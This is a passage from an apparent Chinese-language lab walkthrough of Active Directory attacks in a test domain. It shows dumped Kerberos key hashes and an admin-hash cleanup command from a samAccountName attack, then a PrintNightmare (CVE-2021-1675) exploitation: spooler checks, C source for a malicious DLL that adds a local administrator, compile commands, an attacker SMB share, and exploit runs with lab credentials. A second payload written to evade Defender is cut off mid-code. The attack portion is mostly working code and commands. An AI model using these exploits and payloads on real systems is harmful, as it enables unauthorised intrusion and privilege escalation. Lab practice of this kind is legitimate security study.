      samaccount$:aes128-cts-hmac-sha1-96:98c00ce456e342106141609163511daa
      samaccount$:des-cbc-md5:f8ab2001bcecc252
      SEVENKINGDOMS$:aes256-cts-hmac-sha1-96:0a4c51ad0442d3135e33f5a26c5d6f625044f1b10d634fa1b09cb6df8e06662a
      SEVENKINGDOMS$:aes128-cts-hmac-sha1-96:8e6f08920d93f3ee55c15d299e3ea7a6
      SEVENKINGDOMS$:des-cbc-md5:7a265858ea9eb0d9
      [*] Cleaning up...
现在通过使用刚刚获得的管理员帐户哈希 删除我们创建的计算机 进行清理
    python addcomputer.py -computer-name 'samaccountname$' -delete -dc-host winterfell.north.sevenkingdoms.local -domain-netbios NORTH -hashes 'aad3b435b51404eeaad3b435b51404ee:dbd13e1c4e338284ac4e9874f7de6ef4' 'north.sevenkingdoms.local/Administrator'
很奇怪 变成了samaccount 可我们添加的是由samaccountname
排查了下 原来是前边写错了 问题不大
随手测一下exec
## PrintNightmare
### 检查spooler
为了利用 printnightmare，我们将首先检查spooler是否在目标上处于活动状态
    # cme 
    cme smb 192.168.56.10-23 -M spooler
    # 或者impacket
    python rpcdump.py @192.168.56.10 | egrep 'MS-RPRN|MS-PAR'
可见都开着
### 准备impacket
要利用 cube0x0 脚本，您不再需要修改后的 impacket 版本，因为修改已合并到主项目中：
  * 
  * 
直接使用最新版即可
### 准备dll
  * 让我们准备利用dll
  * 我们将创建一个用户并将其添加为本地管理员
  * 创建文件 nightmare.c：
    #include  
    int RunCMD()
    {
        system("net users pnightmare Passw0rd123. /add");
        system("net localgroup administrators pnightmare /add");
        return 0;
    }
    BOOL APIENTRY DllMain(HMODULE hModule,
        DWORD ul_reason_for_call,
        LPVOID lpReserved
    )
    {
        switch (ul_reason_for_call)
        {
        case DLL_PROCESS_ATTACH:
            RunCMD();
            break;
        case DLL_THREAD_ATTACH:
        case DLL_THREAD_DETACH:
        case DLL_PROCESS_DETACH:
            break;
        }
        return TRUE;
    }
  * 编译
    sudo apt-get install mingw-w64 -y
    x86_64-w64-mingw32-gcc -shared -o nightmare.dll nightmare.c
### 在旧的Windows Server 2016 上攻击(meereen 192.168.56.12)
  * 克隆仓库
    git clone https://github.com/cube0x0/CVE-2021-1675 printnightmare
  * 准备一个带有dll的smb共享
    python smbserver.py -smb2support ATTACKERSHARE .
  * 检查没有用户pnightmare
  * 在Braavos（192.168.56.23）尝试
    * Braavos 是最新的 windows server 2016，该漏洞利用将不起作用（如果您在 castelblack 服务器上尝试north域，则会出现相同的错误）
  * 在Meereen上利用（这个jorah.mormont的密码哪里来的？之前获得的用户应该是
    python CVE-2021-1675.py essos.local/jorah.mormont:'H0nnor!'@meereen.essos.local '\\192.168.56.1\ATTACKERSHARE\nightmare.dll'
  * 成功了
这是我rdp截的图
> Wait, you use domain connection instead of –local-auth with cme no ?
>
>   * 是的，这是因为meereen是一个域控制器
>
>
> “域控制器没有内置域或帐户域。 此外，这些系统不使用 SAM 数据库，而是使用 Microsoft Active Directory
> 目录服务来存储帐户访问信息。”  
>  参见  account-domains>
### 在windows server 2019 (winterfell 192.168.56.11)上攻击
  * 首先执行相同的命令
    python3 CVE-2021-1675.py north.sevenkingdoms.local/jon.snow:'iknownothing'@north.sevenkingdoms.local '\\192.168.56.1\ATTACKERSHARE\nightmare.dll'
  * 也成功了 但是用户不在管理员组里
  * 是因为将用户添加为管理员时被拦截了
  * 需要知道的是：在一些失败之后，spooler服务将被defender停止，并且在有人重新启动服务器或spooler服务之前不会再被利用。
  * 让我们换个可以绕过defender的payload
    /*
     * ADDUSER.C: creating a Windows user programmatically.
     */
    #define UNICODE
    #define _UNICODE
    #include 
    #include 
    #include 
    #include 
    #include 
    DWORD CreateAdminUserInternal(void)
    {
        NET_API_STATUS rc;
        BOOL b;
        DWORD dw;
        USER_INFO_1 ud;
        LOCALGROUP_MEMBERS_INFO_0 gd;
        SID_NAME_USE snu;
        DWORD cbSid = 256;    // 256 bytes should be enough for everybody :)
        BYTE Sid[256];
        DWORD cbDomain = 256 / sizeof(TCHAR);
        TCHAR Domain[256];
        // Create user
        memset(&ud, 0, sizeof(ud));
        ud.usri1_name        = _T("pnightmare2");                // username
        ud.usri1_password    = _T("Test123456789!");             // password
        ud.usri1_priv        = USER_PRIV_USER;                   // cannot set USER_PRIV_ADMIN on creation
        ud.usri1_flags       = UF_SCRIPT | UF_NORMAL_ACCOUNT;    // must be set
        ud.usri1_script_path = NULL;
        rc = NetUserAdd(
            NULL,            // local server
            1,                // information level
            (LPBYTE)&ud,
            NULL            // error value
        );
        if (rc != NERR_Success) {
            _tprintf(_T("NetUserAdd FAIL %d 0x%08x\r\n"), rc, rc);
            return rc;
        }
       _tprintf(_T("NetUserAdd OK\r\n"), rc, rc);
        // Get user SID
        b = LookupAccountName(
            NULL,            // local server
            ud.usri1_name,   // account name
            Sid,             // SID
            &cbSid,          // SID size
            Domain,          // Domain
            &cbDomain,       // Domain size
            &snu             // SID_NAME_USE (enum)
        );
        if (!b) {
            dw = GetLastError();
            _tprintf(_T("LookupAccountName FAIL %d 0x%08x\r\n"), dw, dw);
            return dw;
        }
        // Add user to "Administrators" local group
        memset(&gd, 0, sizeof(gd));
        gd.lgrmi0_sid = (PSID)Sid;
        rc = NetLocalGroupAddMembers(
            NULL,                    // local server
            _T("Administrators"),
            0,                        // information level
            (LPBYTE)&gd,
            1                        // only one entry
        );
        if (rc != NERR_Success) {
            _tprintf(_T("NetLocalGroupAddMembers FAIL %d 0x%08x\r\n"), rc, rc);
            return rc;
        }
        return 0;
    }
    //
    // DLL entry point.
    //
    BOOL APIENTRY DllMain(HMODULE hModule, DWORD  ul_reason_for_call, LPVOID lpReserved)
    {